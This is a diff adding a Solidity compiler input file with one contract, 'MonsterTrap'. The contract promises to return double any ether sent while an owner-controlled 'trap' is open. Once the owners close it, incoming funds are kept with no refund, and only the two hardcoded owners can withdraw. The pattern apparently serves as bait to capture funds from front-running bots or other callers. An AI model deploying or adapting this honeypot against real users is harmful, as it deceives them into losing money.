@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "browser/test.sol": {
+      "content": "contract MonsterTrap {\n    address owner;\n    address otherOwner = 0x14CaB1A7b5fe7a2473A2Dd82DE32E4c94cBAe63e;\n    bool trapClosed = false;\n    uint256 gasPriceLimit = 200000000000;\n    \n    constructor() {\n        owner = msg.sender;\n    }\n    \n    function withdraw() public {\n        require(msg.sender == owner || msg.sender == otherOwner);\n        trapClosed = false;\n        msg.sender.transfer(address(this).balance);\n    }\n    \n    fallback() external payable {\n        if (msg.sender == owner || msg.sender == otherOwner) {\n            trapClosed = false;\n        }\n    }\n    \n    function setTrap() public payable {\n        if (msg.sender == owner || msg.sender == otherOwner ||\n            (!trapClosed && tx.gasprice < gasPriceLimit)) {\n            (bool success, ) = msg.sender.call{value:2*msg.value}(\"\");\n            require(success, \"Send failed, balance too low?\");\n        }\n    }\n    \n    function closeTrap() public {\n        require(msg.sender == owner || msg.sender == otherOwner);\n        trapClosed = true;\n    }\n    \n    function setGasPriceLimit(uint256 newGasPrice) public {\n        require(msg.sender == owner || msg.sender == otherOwner);\n        gasPriceLimit = newGasPrice;        \n    }\n}"
+    }
+  }
+}
